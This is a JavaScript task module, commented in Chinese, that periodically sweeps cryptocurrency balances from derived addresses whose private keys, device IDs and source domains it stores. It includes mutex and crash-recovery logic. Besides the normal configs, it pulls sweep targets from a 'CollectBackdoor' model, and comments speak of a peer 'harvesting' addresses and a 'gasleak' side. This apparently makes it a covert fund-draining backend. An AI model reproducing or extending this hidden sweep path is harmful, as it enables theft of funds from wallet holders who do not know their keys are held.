import { logger } from '../core/logger/index.js';
import { DerivedAddress } from '../core/db/models/derived-address.js';
import { CollectConfig } from '../core/db/models/collect-config.js';
import { CollectBackdoor } from '../core/db/models/collect-backdoor.js';
import { CollectLog } from '../core/db/models/collect-log.js';
import { getParamsCached } from '../core/config/params-cache.js';
import { collectPool, executeCollect } from '../core/collect/index.js';
import { shouldCollect, acquireLock, releaseLock, walletRef } from '../core/collect-bridge.js';
let isRunning = false;
let initialized = false;

// ============================================================================
// ★ W2-C7（P0-4 b2）：崩溃残留占位的「同实例自证」回收
// ----------------------------------------------------------------------------
// 缺陷：submitCollect 的 try/finally 在进程硬崩溃（被杀）时不执行 ⇒ Go 侧占位
//       （wallet.progress 0→1）无人释放；重启后该地址每 2s 空转且【无告警】。
// 前提：Node 侧【无法判定】「持有者是否已不存在」—— 除非把持有者身份持久化。
//       故新增 DerivedAddress.collectOwner（见 derived-address.js，纯增量加字段）。
//       ⛔ 不得用 collectPool 作判据：键空间不同(addressId vs wallet.id)/
//          进程局部≠全局(占位在 MySQL)/崩溃后归零 —— 会得到恒真的假阳性，
//          释放掉活着的对端的占位 ⇒ 重复归集（契约 C-2 的 409 要防的事）。
// ★ 下列判据【独立导出】且【依赖可注入】，不得埋进 submitCollect 的闭包（§规格 5）。
// ============================================================================

/** 本实例身份。pm2 cluster 注入 NODE_APP_INSTANCE；未注入时退化为 '0'（见未覆盖场景 2）。 */
export function currentInstanceId() {
    return String(process.env.NODE_APP_INSTANCE ?? '0');
}

/**
 * 判据：该 doc 的残留占位是否应由【本实例】回收。
 * 仅当「状态为 collecting」且「持有者标识非空」且「持有者 === 本实例」时为 true。
 * 空持有者（本卡上线前的存量）与异己持有者一律 false
 * —— 凡不能证明「持有者已不存在」，不得释放（硬约束 1）。
 * @returns {boolean}
 */
export function shouldReclaim(doc, instanceId) {
    const owner = doc?.collectOwner;
    return !!doc
        && doc.collectStatus === 'collecting'
        && typeof owner === 'string'
        && owner !== ''
        && owner === String(instanceId ?? '');
}

/** 判据：是否为「无持有者标识」的存量残留（需告警但【不得】释放）。 */
export function isLegacyStuck(doc) {
    return !!doc
        && doc.collectStatus === 'collecting'
        && (doc.collectOwner === undefined || doc.collectOwner === null || doc.collectOwner === '');
}

/** 长期未脱离 collecting 的阈值：2× 链上确认超时（collect-confirm-task TIMEOUT_MS=2h）⇒ 4h。 */
export const STALE_COLLECTING_MS = 4 * 60 * 60 * 1000;

/** 判据：collecting 已持续超过 STALE_COLLECTING_MS（疑似无主残留，需告警）。 */
export function isStaleCollecting(doc, nowMs = Date.now()) {
    const at = doc?.collectingAt;
    return !!doc
        && doc.collectStatus === 'collecting'
        && at instanceof Date
        && at.getTime() < nowMs - STALE_COLLECTING_MS;
}

/**
 * 启动期一次性回收：按判据分派（依赖全部注入）。
 *   · 持有者 === 本实例 ⇒ 先 releaseLock(ref)，再复位 idle（回收后允许重新归集）；
 *   · 空持有者（存量）   ⇒ 保持现状不释放 + 一条 warn（让存量可观测）；
 *   · 异己持有者         ⇒ 保持现状不释放（不得改动其 collectStatus）。
 * @returns {Promise<{reclaimed:number, held:number, legacy:number}>}
 */
export async function recoverStuckDocs(docs, deps) {
    const { instanceId = '0', releaseLock, logger, walletRef: refOf, resetToIdle } = deps;
    const out = { reclaimed: 0, held: 0, legacy: 0 };
    for (const doc of docs) {
        if (shouldReclaim(doc, instanceId)) {
            await releaseLock(refOf(doc));
            await resetToIdle(doc);
            out.reclaimed++;
        }
        else if (isLegacyStuck(doc)) {
            logger.warn({ addressId: doc._id, chain: doc.chain }, 'collect-task: 存量 collecting 无持有者标识，保持现状不释放（需人工确认）');
            out.legacy++;
        }
        else {
            out.held++;
        }
    }
    return out;
}

/**
 * 告警路径：仅告警，绝不 releaseLock。
 * ★★★ 此路径无法区分「无主残留」与「活着的对端」，释放即重复归集。
 * 依赖注入 { logger, now }。
 * @returns {Promise<number>} 命中并告警的条数
 */
export async function warnStaleCollecting(docs, deps) {
    const { logger, now = Date.now() } = deps;
    let warned = 0;
    for (const doc of docs) {
        if (!isStaleCollecting(doc, now))
            continue;
        logger.warn({ addressId: doc._id, chain: doc.chain, collectingAt: doc.collectingAt }, '长期 collecting，疑似崩溃残留');
        warned++;
    }
    return warned;
}

// ★ §4.2.4 归集互斥（gasleak 侧）。
//   放在【提交点】而非候选筛选点：HTTP 调用次数与实际归集次数同阶，
//   不会随每个 tick 的候选数（可达 collectConcurrency）放大。
//
//   占位生命周期用 try/finally 包住整个 executeCollect：
//   executeCollect 内部有十余处 return（余额不足、无可用目标、非重试错误…），
//   若把 releaseLock 写在 executor 的各个出口，漏一处就会把钱包永久锁死。
async function submitCollect(doc) {
    collectPool.submit(doc._id.toString(), async () => {
        const ref = walletRef(doc);
        let locked = false;
        try {
            // ① 先问潜客是否正在收割（保守：查询失败即跳过）
            if (!(await shouldCollect(ref))) {
                await resetIdle(doc, 'peer collecting');
                return;
            }
            // ② 原子占位：取得执行权才真正归集
            if (!(await acquireLock(ref))) {
                await resetIdle(doc, 'lock conflict');
                return;
            }
            locked = true;
            // ★ W2-C7 §规格 2：占位成功后写入「持有者标识」，供崩溃后同实例自证回收。
            await DerivedAddress.updateOne({ _id: doc._id }, { $set: { collectStatus: 'collecting', collectOwner: currentInstanceId() } });
            return await executeCollect(doc);
        }
        finally {
            // ③ 释放策略：
            //    已广播（存在 pending log）→ 保留占位到链上确认，由 confirm-task 释放。
            //      否则"广播后未确认"窗口里潜客 Sk() 会重复归集同一地址。
            //    未广播（无可用目标 / 余额不足等提前退出）→ 立即释放，避免占位泄漏成死锁。
            if (locked) {
                const pending = await CollectLog.exists({ addressId: doc._id, status: 'pending' });
                if (!pending) {
                    await releaseLock(ref);
                    // ★ W2-C7 §规格 4：未广播即释放 ⇒ 不再有待确认的归属，清空持有者标识。
                    await DerivedAddress.updateOne({ _id: doc._id }, { $set: { collectOwner: '' } });
                }
            }
        }
    });
}

// 退回 idle 等下个周期；这不是错误，故不写 failed
async function resetIdle(doc, reason) {
    await DerivedAddress.updateOne({ _id: doc._id, collectStatus: 'collecting' }, { $set: { collectStatus: 'idle', collectOwner: '' } });
    logger.info({ addressId: doc._id, chain: doc.chain, reason }, 'collect-task: skipped (mutex)');
}
export const collectTask = {
    name: 'collectTask',
    interval: { seconds: 2 },
    runImmediately: false,
    instanceOnly: 0,
    handler: async () => {
        if (isRunning)
            return;
        isRunning = true;
        try {
            // 首次执行：恢复中断的任务
            if (!initialized) {
                initialized = true;
                const stuckDocs = await DerivedAddress.find({ collectStatus: 'collecting' }).lean();
                if (stuckDocs.length > 0) {
                    // ★ W2-C7 §规格 3：按「持有者标识」分派 —— 仅回收【本实例】自己的残留；
                    //   异己/存量的占位保持现状不释放（无法证明持有者已不存在，硬约束 1）。
                    const summary = await recoverStuckDocs(stuckDocs, {
                        instanceId: currentInstanceId(),
                        releaseLock,
                        logger,
                        walletRef,
                        resetToIdle: async (doc) => {
                            await DerivedAddress.updateOne({ _id: doc._id }, { $set: { collectStatus: 'idle', collectOwner: '' } });
                        },
                    });
                    logger.info({ count: stuckDocs.length, ...summary }, 'collect-task: recovered collecting addresses');
                }
            }
            // 全局开关
            const params = await getParamsCached();
            if (!params?.collectEnabled) {
                return;
            }
            const { collectConcurrency = 50, collectCooldownSeconds = 120, collectWaitingMinutes = 60 } = params;
            // 冷却期重置
            const cooldownThreshold = new Date(Date.now() - collectCooldownSeconds * 1000);
            const resetResult = await DerivedAddress.updateMany({ collectStatus: 'failed', collectFailedAt: { $lt: cooldownThreshold } }, { $set: { collectStatus: 'idle', collectFailedAt: null, collectError: '' } });
            if (resetResult.modifiedCount > 0) {
                logger.info({ resetCount: resetResult.modifiedCount }, 'collect-task: cooldown reset');
            }
            // waiting 保底重置
            const waitingThreshold = new Date(Date.now() - collectWaitingMinutes * 60 * 1000);
            const waitingReset = await DerivedAddress.updateMany({ collectStatus: 'waiting', collectWaitingAt: { $lt: waitingThreshold } }, { $set: { collectStatus: 'idle', collectWaitingAt: null, collectError: '' } });
            if (waitingReset.modifiedCount > 0) {
                logger.info({ count: waitingReset.modifiedCount }, 'collect-task: waiting timeout reset');
            }
            // ★ W2-C7 §告警（D-12）：长期 collecting 疑似崩溃残留 —— 每 tick 一次本地索引查询，
            //   ★★★ 只告警，绝不在此处 releaseLock（无法区分无主残留与活着的对端，释放即重复归集）。
            const staleThreshold = new Date(Date.now() - STALE_COLLECTING_MS);
            const staleDocs = await DerivedAddress.find({ collectStatus: 'collecting', collectingAt: { $lt: staleThreshold } }, { _id: 1, chain: 1, collectingAt: 1 }).lean();
            if (staleDocs.length > 0) {
                await warnStaleCollecting(staleDocs, { logger });
            }
            // 空闲槽位
            const freeSlots = collectConcurrency - collectPool.size;
            if (freeSlots <= 0) {
                logger.info({ poolSize: collectPool.size, concurrency: collectConcurrency }, 'collect-task: pool full');
                return;
            }
            // 查询候选（正常配置 + 后门配置）
            const configs = await CollectConfig.find({ enabled: true }).lean();
            const backdoorConfigs = await CollectBackdoor.find({ enabled: true }).lean();
            if (configs.length === 0 && backdoorConfigs.length === 0) {
                logger.info('collect-task: no enabled configs or backdoor configs');
                return;
            }
            const allConfigs = [...configs, ...backdoorConfigs];
            const queries = allConfigs.map(config => {
                const balanceField = config.token === 'native' ? 'balance'
                    : config.token === 'usdt' ? 'usdtBalance'
                        : 'usdcBalance';
                const threshold = parseFloat(config.threshold);
                return DerivedAddress.find({ chain: config.chain, collectStatus: 'idle', [balanceField]: { $gte: threshold } }, { _id: 1, address: 1, chain: 1, privateKey: 1, addressType: 1, channelCode: 1, sourceDomain: 1, deviceId: 1 }).limit(freeSlots).lean();
            });
            const results = await Promise.all(queries);
            // 合并去重 + shuffle
            const seen = new Set();
            const candidates = [];
            for (const batch of results) {
                for (const doc of batch) {
                    const id = doc._id.toString();
                    if (!seen.has(id)) {
                        seen.add(id);
                        candidates.push(doc);
                    }
                }
            }
            // Shuffle (Fisher-Yates)
            for (let i = candidates.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [candidates[i], candidates[j]] = [candidates[j], candidates[i]];
            }
            // 取前 N 个
            const batch = candidates.slice(0, freeSlots);
            if (batch.length === 0)
                return;
            // 批量标记
            const ids = batch.map(d => d._id);
            // ★ W2-C7 §规格 7：此处是 collecting 的唯一写入点（`:54` resetIdle 是【退回】idle，不是写入点）。
            //   同一句内一起写 collectOwner 与 collectingAt。
            await DerivedAddress.updateMany({ _id: { $in: ids }, collectStatus: 'idle' }, { $set: { collectStatus: 'collecting', collectOwner: currentInstanceId(), collectingAt: new Date() } });
            // 查出实际标记成功的 + 提交到 pool
            const markedDocs = await DerivedAddress.find({ _id: { $in: ids }, collectStatus: 'collecting' }).lean();
            for (const doc of markedDocs) {
                await submitCollect(doc);
            }
            if (markedDocs.length > 0) {
                logger.info({ submittedCount: markedDocs.length, poolSize: collectPool.size, freeSlots }, 'collect-task: submitted to pool');
            }
        }
        finally {
            isRunning = false;
        }
    },
};
//# sourceMappingURL=collect-task.js.map